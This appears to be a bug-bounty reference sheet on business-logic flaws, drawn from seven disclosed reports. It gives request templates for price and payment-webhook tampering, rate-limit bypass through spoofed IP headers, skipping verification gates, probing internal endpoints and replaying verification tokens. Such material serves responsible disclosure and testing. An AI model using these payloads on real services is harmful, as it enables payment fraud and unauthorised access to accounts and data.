# Business Logic — 7 Disclosed Reports

**Affected platforms:** Valve/Steam, Shopify, Airbnb, Uber, Mozilla Monitor, Snapchat, Yelp

---

## Root Cause Patterns

1. Server trusts frontend price calculations without backend re-validation
2. Verification gates exist in UI only, not enforced at API level
3. Rate limiting reads from spoofable headers
4. Payment webhooks lack HMAC signature validation
5. Internal employee pages deployed without authentication
6. Phone verification grants trust on submission, not confirmed ownership
7. Draft storefronts retain full transaction functionality while unlisted

---

## Paid Patterns

**Price and payment tampering:**
```http
POST /checkout
{"item_id": 123, "quantity": 1, "price": 0.01}

# Or intercept in-flight webhook
POST /webhooks/payment
{"amount": 0.01, "status": "paid", "order_id": 456}
# No HMAC signature validation - accepts spoofed payment confirmation
```

**Rate-limit bypass:**
```
# Rotate spoofable headers per request
X-Forwarded-For: 1.1.1.1
X-Forwarded-For: 1.1.1.2
X-Real-IP: 2.2.2.2
True-Client-IP: 3.3.3.3
CF-Connecting-IP: 4.4.4.4
```

**Verification gate skip:**
```http
# Access post-verification endpoint directly without completing verification
GET /dashboard/premium-feature    (without completing email verification)
POST /api/monitor-email           (without confirming ownership of monitored address)
```

**Internal endpoint discovery:**
```bash
# Search JS bundles for internal paths
grep -r "\/employee\|\/internal\|\/staff\|\/admin-only" dist/*.js
# Test unauthenticated access on each found path
curl -sk https://target.com/internal/storefront
```

**Verification token replay:**
```
# Verify account A with token T
# Log out, register account B
# Replay token T to verify account B without re-verification
```

---

## Real-World Scenarios

**Scenario 1 - Exposed internal storefront (Shopify-type)**
Unauthenticated access to draft storefront. Full checkout functionality active despite unlisted status. Free physical merchandise ordered and shipped at company expense.

**Scenario 2 - In-flight payment tampering**
Amount field modified to $0.01 in intercepted request. Payment webhook accepts spoofed confirmation without HMAC validation. Full-value goods delivered.

**Scenario 3 - Email monitoring bypass (Mozilla Monitor)**
Verification gate enforced only in UI. Direct API call to `/api/monitor-email` skipped verification. Attacker monitored any email address, accessing breach data without victim consent.

---

## Pre-Submission Validation Gate

1. Can an attacker gain measurable value? (free goods, elevated access, unauthorized data)
2. Is the impact demonstrable? (screenshot the outcome, not just the bypass)
3. Is this a supported workflow or a clearly unintended path?
